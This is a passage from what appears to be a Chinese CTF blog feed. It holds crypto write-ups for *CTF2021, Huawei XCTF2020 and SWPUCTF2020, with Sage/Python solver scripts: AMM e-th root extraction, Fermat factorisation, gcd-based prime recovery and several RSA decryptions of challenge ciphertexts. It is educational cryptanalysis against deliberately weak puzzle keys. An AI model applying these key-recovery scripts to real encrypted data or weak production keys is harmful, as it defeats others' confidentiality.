class="number">20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607</span></span><br><span class="line">d1 = <span class="number">36167461773898995192586226632578677184913220227461899855497899052924496298787</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">17653913822265292046140436077352027388518012934178497059850703004839268622175666123728756590505344279395546682262531546841391088108347695091027910544112830270722179480786859703225421972669021406495452107007154426730798752912163553332446929049057464612267870012438268458914652129391150217932076946886301294155031704279222594842585123671871118879574946424138391703308869753154497665630799300138651304835205755177940116680821142858923842124294529640719629497853598914963074656319325664210104788201957945801990296604585721820046391439235286951088086966253038989586737352467905401107613763487302070546247282406664431777475</span></span><br><span class="line">p = pow(c1,d1,n1) + <span class="number">1</span></span><br><span class="line">n = <span class="number">22346087036331379968192118389403047568445805414881948978518580277027027486284293415097623011228506968071753709256352246733181304513713003096615266613365080909760605498017330085960699607777361429562376124376340215426398797920168016137830563564636922257215066266075494625782943973857490781916694118187094786034792437781964601089843549995939887939410763350338658901108020658475956489391300528691289604149598720803012371765770928211044755626045817053870803040863722458554924076011151695567147976903053993914859714631837755435592006986598006207692599019026644753575853382810261910332197447386727419606073948645238377595719</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">cipher = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">print(p)</span><br><span class="line">print(q)</span><br></pre></td></tr></table></figure><p><code>real_tirck</code>中给出了<code>e</code>的下界，以及告诉<code>e</code>和<code>phi</code>并不互素，所以我们猜测 $e\mid\varphi(n)$ （这里其实应该有证明的，有时间了再回来证），所以我们从下界爆破<code>e</code>，并使用AMM测试，能够跑出<code>flag</code>的即为正确的<code>e</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AMM</span>(<span class="params">o, r, q</span>):</span></span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q<span class="number">-1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    a = p ^ (r**(t<span class="number">-1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t<span class="number">-1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findAllPRoot</span>(<span class="params">p, e</span>):</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = set()</span><br><span class="line">    <span class="keyword">while</span> len(proot) &lt; e:</span><br><span class="line">        proot.add(pow(random.randint(<span class="number">2</span>, p<span class="number">-1</span>), (p<span class="number">-1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = set()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(pow(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">mq = AMM(cq, e, q)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">q_proot = findAllPRoot(q, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line">print(mps, mqs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">m</span>):</span></span><br><span class="line">    h = m.hex()</span><br><span class="line">    <span class="keyword">if</span> len(h) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> bytes.fromhex(h).startswith(<span class="string">b&#x27;*CTF&#x27;</span>) <span class="keyword">or</span> bytes.fromhex(h).startswith(<span class="string">b&#x27;*ctf&#x27;</span>):</span><br><span class="line">        print(bytes.fromhex(h))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq = []</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">print(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        solution = CRT_list([int(mpp), int(mqq)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> check(solution):</span><br><span class="line">            print(solution)</span><br><span class="line">            qwq.append(solution)</span><br><span class="line">    print(time.time() - start)</span><br><span class="line"></span><br><span class="line">print(qwq)</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">&quot;&#123;&#125; s.&quot;</span>.format(end - start))</span><br><span class="line"><span class="comment"># 1061.3823564052582 s.</span></span><br><span class="line"><span class="comment"># b&#x27;*CTF&#123;S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This&#125;Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww&#x27;</span></span><br><span class="line"><span class="comment"># 5715792447162584004830995621288196364667316788985719423575200593843082226610550301623816157835166569193582787431644910982754181340491582409788340367828925355394884518044538804653367543125682677650052644197537897019515168750419392615178911318381369421233129629180441067485047</span></span><br></pre></td></tr></table></figure><h3 id="MyCurve"><a href="#MyCurve" class="headerlink" title="MyCurve"></a>MyCurve</h3><p>先放个神仙的sol和资料，有时间回来复现</p><p>binary edwards curve<br>这个曲线和正常的ecc有一个一一对应的映射<br>映射回去的曲线的阶光滑<br>容易算dlp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">name binary Edwards curves</span><br><span class="line">parameter d1</span><br><span class="line">parameter d2</span><br><span class="line">coordinate x</span><br><span class="line">coordinate y</span><br><span class="line">satisfying d1(x+y)+d2(x^2+y^2) &#x3D; (x+x^2)(y+y^2)</span><br><span class="line">addition x &#x3D; (d1(x1+x2)+d2(x1+y1)(x2+y2)+(x1+x1^2)(x2(y1+y2+1)+y1 y2)) &#x2F; (d1+(x1+x1^2)(x2+y2))</span><br><span class="line">addition y &#x3D; (d1(y1+y2)+d2(x1+y1)(x2+y2)+(y1+y1^2)(y2(x1+x2+1)+x1 x2)) &#x2F; (d1+(y1+y1^2)(x2+y2))</span><br><span class="line">doubling x &#x3D; (d1(x1+x1)+d2(x1+y1)(x1+y1)+(x1+x1^2)(x1(y1+y1+1)+y1 y1)) &#x2F; (d1+(x1+x1^2)(x1+y1))</span><br><span class="line">doubling y &#x3D; (d1(y1+y1)+d2(x1+y1)(x1+y1)+(y1+y1^2)(y1(x1+x1+1)+x1 x1)) &#x2F; (d1+(y1+y1^2)(x1+y1))</span><br><span class="line">negation x &#x3D; y1</span><br><span class="line">negation y &#x3D; x1</span><br><span class="line">toweierstrass u &#x3D; d1(d1^2+d1+d2)(x+y)&#x2F;(x y+d1(x+y))</span><br><span class="line">toweierstrass v &#x3D; d1(d1^2+d1+d2)(x&#x2F;(x y+d1(x+y))+d1+1)</span><br><span class="line">a0 &#x3D; 1</span><br><span class="line">a1 &#x3D; 1</span><br><span class="line">a2 &#x3D; d1^2+d2</span><br><span class="line">a3 &#x3D; 0</span><br><span class="line">a4 &#x3D; 0</span><br><span class="line">a6 &#x3D; d1^4(d1^4+d1^2+d2^2)</span><br><span class="line">fromweierstrass x &#x3D; d1(u+d1^2+d1+d2)&#x2F;(u+v+(d1^2+d1)(d1^2+d1+d2))</span><br><span class="line">fromweierstrass y &#x3D; d1(u+d1^2+d1+d2)&#x2F;(v+(d1^2+d1)(d1^2+d1+d2))</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>最后摸了好久的鱼，不然就能AK了，呜呜，爬了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WP-for-ctf2021&quot;&gt;&lt;a href=&quot;#WP-for-ctf2021&quot; class=&quot;headerlink&quot; title=&quot;WP for *ctf2021&quot;&gt;&lt;/a&gt;WP for *ctf2021&lt;/h1&gt;&lt;p&gt;第一次和V&amp;amp;N的师傅们打比赛就冲到了第六，好耶！&lt;/p&gt;
&lt;p&gt;最后没AK，不好（悲）&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Wp for 华为XCTF2020鸿蒙计算专场&#39;s crypto</title>
    <link href="http://example.com/2020/12/23/Wp-for-%E5%8D%8E%E4%B8%BAXCTF2020-s-crypto/"/>
    <id>http://example.com/2020/12/23/Wp-for-%E5%8D%8E%E4%B8%BAXCTF2020-s-crypto/</id>
    <published>2020-12-23T09:02:49.000Z</published>
    <updated>2021-03-11T01:21:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto"><a href="#Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto" class="headerlink" title="Wp for 华为XCTF2020鸿蒙计算专场’s crypto"></a>Wp for 华为XCTF2020鸿蒙计算专场’s crypto</h1><a id="more"></a><h2 id="RRSSAA"><a href="#RRSSAA" class="headerlink" title="RRSSAA"></a>RRSSAA</h2><p>题目分三个level，加密了三次，我们反过来解密就好了</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>观察<code>e</code>的生成代码，发现存在 $e=4\times (1+k\times (p-1))+3$ 这一关系，即 $e=7+k\times(p-1)$ ，所以由费马小定理有 $m^e=m^7\ (mod\ p)$ ，所以可知 $p\mid m^e-m^7$ ，那么可以算出 $p=gcd(m^e-m^7,n)$</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>因为<code>t = next_prime(o) u = next_prime(s)</code>，所以<code>p1q1、p1q2、p2q1、p2q2</code>都比较相近，联想费马分解，因为 $n=x^2-y^2=(x+y)\times(x-y)=a\times b$ ，所以我们使用费马分解在 $\sqrt{n}$ 附近寻找<code>x</code>并计算<code>y</code>，而此时我们得到的 <code>(x,y)</code> 则是<code>p1q1与p2q2</code>、<code>p1q2与p2p1</code>、<code>p1p2与q1q2</code>中的其中一个，那当我们得到两组合法的<code>(x,y)</code>后，即可通过<code>gcd</code>来得到<code>p1,p2,q1,q2</code>了</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>又是<code>next_prime</code>，观察到  $y$ 与 $21\cdot x$ 相近， $z$ 与 $3\cdot x\cdot y$ 相近，可知 $n = x\cdot y\cdot z\approx 1363\cdot x^4$ ，所以我们在 $\sqrt[4]\frac{n}{1363}$ 的周围即可找到 $x$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#level3</span></span><br><span class="line">c4 = <span class="number">2223858574968933504319836040365324804971094330459462393944127171432282147604729897704345429059208580970050059952008010773685842392707183675848552727061753816604521338667996166424030688312622416918364914092916834363424563757848785094598668876885795408211613686469658206698800530604510586036849762682266643367887969834461905627352683770069831534697242348271330554339411094917823350455146582135451453515538908713886757653213973927096082</span>********************************************</span><br><span class="line">m4 = <span class="number">81225738828166640599054154023183465870678960906769673605358084529196871174429427936591822589995476552044227730868809310992934103731850597399114246762836121101348301079296663951503688072299542357013093324718850936925265954204973634470836187733828189312553819810470</span>********************************************</span><br><span class="line">c3 = <span class="number">23850649176609488069574576816416148886692179606070063605432689009210174812454985632639914109186048913143848105334392538145230671686367689762200590281089005923231195246579033646977003291454535177690932650527152046258702322882034275451509830373108765348015483098908530262342484124214979398113857256424921042629540596777935387076042051793448841426568428955677950006478374618351793957423993726834602082713108846572798935325391218935581430299</span>********************************************</span><br><span class="line">n3 = <span class="number">245027309396554072925434368973821962975166642272733206023979068786967233722428777765504465639508676248193528531220331147117321254335887247798699854774950988027443444489150326074699546422578258559318722819082323316238297250430318005357394321339486074483626412040345465814449044087548920371100312025734633992016258120056152646898775372319740238700067921969618291620584466621726342124271864707245999413528305460437729692977332395186047416381</span>********************************************</span><br><span class="line"></span><br><span class="line">p3 = gcd(c4 - pow(m4,<span class="number">7</span>,n3),n3)</span><br><span class="line">q3 = n3 // p3</span><br><span class="line"><span class="keyword">assert</span> p3 * q3 == n3</span><br><span class="line">phi3 = (p3<span class="number">-1</span>) * (q3<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = getPrime(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span>(gcd(s,p3<span class="number">-1</span>) == <span class="number">1</span>):</span><br><span class="line">        sinv = invert(s,p3<span class="number">-1</span>)</span><br><span class="line">        e = <span class="number">4</span>*s*sinv+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span>(gcd(phi3,e) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(pow(m4,e,n3)==c4):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">e3 = e</span><br><span class="line">d3 = invert(e3,phi3)</span><br><span class="line">m3 = pow(c3,d3,n3)</span><br><span class="line">print(<span class="string">&#x27;Level3 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat_factorization</span>(<span class="params">n</span>):</span></span><br><span class="line">    factor_list = []</span><br><span class="line">    get_context().precision = <span class="number">2048</span></span><br><span class="line">    x = int(sqrt(n))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        y2 = x ** <span class="number">2</span> - n</span><br><span class="line">        <span class="keyword">if</span> is_square(y2):</span><br><span class="line">            <span class="comment">#print(&#x27;x = &#x27;,x)</span></span><br><span class="line">            y2 = mpz(y2)</span><br><span class="line">            get_context().precision = <span class="number">2048</span></span><br><span class="line">            y = int(sqrt(y2))</span><br><span class="line">            factor_list.append([x+y, x-y])</span><br><span class="line">        <span class="keyword">if</span> len(factor_list) == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"><span class="comment">#level2</span></span><br><span class="line">c2 = m3</span><br><span class="line">n2 = <span class="number">87994385997075478104135902527696370476697303732829349373685150934389771812000800579489779988597377758155357032119662485786694473083701713238817766110307526481354801968791624978964643229368334587752275506234350005276147810555241459363533576625362804706641125169760333584993303919294358578117889235906667830900166286169</span>********************************************</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">factor_list = fermat_factorization(n2)</span><br><span class="line">[X1, Y1] = factor_list[<span class="number">0</span>]</span><br><span class="line">[X2, Y2] = factor_list[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> X1 * Y1 == n2</span><br><span class="line"><span class="keyword">assert</span> X2 * Y2 == n2</span><br><span class="line">p21 = gcd(X1, X2)</span><br><span class="line">q21 = X1 // p21</span><br><span class="line">p22 = gcd(Y1, Y2)</span><br><span class="line">q22 = Y1 // p22</span><br><span class="line"><span class="keyword">assert</span> p21 *p22 * q21 * q22 == n2</span><br><span class="line">phi2 = (p21 - <span class="number">1</span>) * (q21 - <span class="number">1</span>) * (p22 - <span class="number">1</span>) * (q22 - <span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2,phi2)</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line">print(<span class="string">&#x27;Level2 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#level1</span></span><br><span class="line">c1 = m2</span><br><span class="line">n1 = <span class="number">72968331464378596578736213097836639538889759902365332315018563128110329234698340288949958887638828272808811489147149910844881732898599415772529999325992095319128544723262119362648159655825918097703197797125275721741525608198285972415832787315444112461546745146260018587323632627512444194155444076538738583091</span>********************************************</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">base = iroot(n1//<span class="number">21</span>//<span class="number">63</span>,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-10000</span>,<span class="number">10000</span>):</span><br><span class="line">    x = base + i</span><br><span class="line">    <span class="keyword">if</span>(isPrime(x)):</span><br><span class="line">        y = next_prime(<span class="number">21</span>*x)</span><br><span class="line">        z = next_prime(<span class="number">3</span>*x*y)</span><br><span class="line">        <span class="keyword">if</span>(x*y*z==n1):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;Level1 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">phi1 = (x<span class="number">-1</span>) * (y<span class="number">-1</span>) * (z<span class="number">-1</span>)</span><br><span class="line">d1 = inverse(e1,phi1)</span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line">flag = long_to_bytes(m1)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/23/ghpPnrLlq2FT8RI.png" alt="27.png"> </p><h2 id="combinelfsr"><a href="#combinelfsr" class="headerlink" title="combinelfsr"></a>combinelfsr</h2><p>没看，想起来了就复现，爬了</p><h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>没看，想起来了就复现，爬了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto&quot;&gt;&lt;a href=&quot;#Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for 华为XCTF2020鸿蒙计算专场’s crypto&quot;&gt;&lt;/a&gt;Wp for 华为XCTF2020鸿蒙计算专场’s crypto&lt;/h1&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Write up for SWPUCTF2020&#39;s Crypto</title>
    <link href="http://example.com/2020/12/07/Wp_for_SWPUCTF2020/"/>
    <id>http://example.com/2020/12/07/Wp_for_SWPUCTF2020/</id>
    <published>2020-12-07T08:37:08.000Z</published>
    <updated>2021-03-11T01:25:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-SWPUTF2020-39-s-Crypto"><a href="#Wp-for-SWPUTF2020-39-s-Crypto" class="headerlink" title="Wp for SWPUTF2020&#39;s Crypto"></a>Wp for SWPUTF2020&#39;s Crypto</h1><p>很无语，T1刚开始数据给错，T2T3连不上，活活让人等到中午才更新</p><a id="more"></a><h2 id="Happy"><a href="#Happy" class="headerlink" title="Happy"></a>Happy</h2><p>基础RSA，题目给出 $q+q\cdot p^3$ 和 $q\cdot p+q\cdot p^2$ </p><p>我们简记为 $data_1$ 与 $data_2$ ，那么显然有 $data_1=q\cdot(p^3+1)$ 、 $data_2=q\cdot(p^2+p)$ 、 $data_1+3\cdot data_2=q\cdot(p^3+3p^2+3p+1)=q\cdot(p+1)^3$ 且 $gcd(data_1,data_2)=q\cdot(p+1)$ ，那么显然可得 $p=\sqrt{ \frac{data_1+3\cdot dota_2}{gcd(data_1,data_2)}}-1$ ，随后可得 $q=\frac{data_1}{p^3+1}$ </p><p>然后RSA相关的数据都有了，直接解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line">e = <span class="number">0x872a335</span></span><br><span class="line">data1 = <span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">data2 = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line"></span><br><span class="line">qp1 = gcd(data1,data2)</span><br><span class="line">qwq = data1 + <span class="number">3</span>*data2</span><br><span class="line"></span><br><span class="line">p12 = qwq // qp1</span><br><span class="line">p = iroot(p12,<span class="number">2</span>)[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">q = data1 // (p**<span class="number">3</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><blockquote><p>flag{happy_rsa_1}</p></blockquote><h2 id="Yusa的密码学课堂-CBC第一课"><a 